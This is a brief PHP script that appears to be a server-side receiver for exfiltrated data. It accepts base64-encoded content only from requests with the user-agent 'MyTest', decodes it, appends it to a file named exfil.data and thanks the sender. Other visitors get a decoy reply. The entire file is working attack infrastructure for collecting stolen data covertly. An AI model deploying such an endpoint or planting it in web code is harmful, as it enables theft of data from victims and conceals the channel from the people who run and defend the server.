<?php

$user_agent = $_SERVER['HTTP_USER_AGENT'];
if ($user_agent == 'MyTest') {
	$content = $_GET['content'];
	$file = '/home/ubuntu/data/exfil.data';
	$saved_file = fopen($file, 'a');
	$decoded = base64_decode($content);
	fwrite($saved_file, $decoded);
	fwrite($saved_file, "\n");
	fclose($saved_file);
	echo 'Success...thanks for the data!';
}
else {
	echo 'I believe you have come to the wrong place';
}
?>
